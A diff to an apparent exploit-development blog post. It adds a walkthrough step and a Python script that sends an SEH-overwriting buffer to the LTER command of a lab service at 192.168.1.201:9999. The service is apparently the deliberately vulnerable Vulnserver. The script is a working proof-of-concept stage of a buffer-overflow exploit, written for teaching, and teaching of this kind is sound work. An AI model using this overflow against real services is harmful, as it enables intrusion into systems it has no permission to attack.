@@ -211,6 +211,8 @@ Finally, we execute `PUSH EAX` which will push our payload `909008EB` right onto
 
 ## Building the Exploit
 
+If you have no experience with SEH overwrite exploits, definitely check out the [first one we did](https://h0mbre.github.io/SEH_Based_Exploit/) in the series before going any further as we won't really spend much time reviewing the basic SEH overwrite techniques. 
+
 Again, this exploit methodology is largely the same as Doyler's as I leaned on his walkthrough heavily, but I still wanted to share it to highlight the techniques it teaches. 
 
 We will pick up at the SEH overwrite which is where we left off in the last post. We know we're restricted to alphanumeric shellcode. Let's overflow the SEH components and then find our offsets with Mona. 
@@ -238,7 +240,33 @@ s.close()
 
 ![](/assets/images/CTP/LTERsehoverwrite.JPG)
 
+After using Mona to determine the offsets, we see that we overwrite SEH at 3514 bytes. So our new payload looks like this: 
+```python
+#!/usr/bin/python
 
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+buffer = 'A' * 3514
+buffer += 'B' * 4
+buffer += 'C' * 4
+buffer += 'D' * (4000 - 3514 - 4 - 4)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("LTER /.../" + buffer)
+print s.recv(1024)
+s.close()
+```
+
+And we can verify that we have overwritten SEH appropriately:
+
+![](/assets/images/CTP/LTERsehoffset.JPG)
 
 
 
